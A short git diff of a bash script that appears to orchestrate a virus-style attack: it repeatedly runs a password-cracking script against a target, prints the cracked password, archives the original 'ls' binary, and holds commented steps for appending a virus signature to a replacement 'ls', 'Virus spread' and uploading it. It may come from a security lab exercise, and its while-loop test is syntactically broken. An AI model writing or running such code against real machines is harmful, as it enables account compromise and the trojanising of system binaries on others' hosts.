@@ -1,7 +1,12 @@
 #!/bin/bash
+sig=0xaabbccdd
 
 chmod +x crack_passwd.py download_ls.py upload_ls.py
 ./crack_passwd.py $1
+#Make sure the password is cracked
+while [ ! -f ./password]; do
+    ./crack_passwd.py $1
+done
 password=`cat ./password`
 echo "Password cracked: $password"
 
@@ -10,7 +15,7 @@ zip ls.zip orgi_ls
 echo "File compressed"
 
 ####execute c to generate new ls
-####append signature
+#echo $(([#16]0xaabbccdd)) >> ./ls
 #echo "Virus spread"
 
 #./upload_ls.py $1
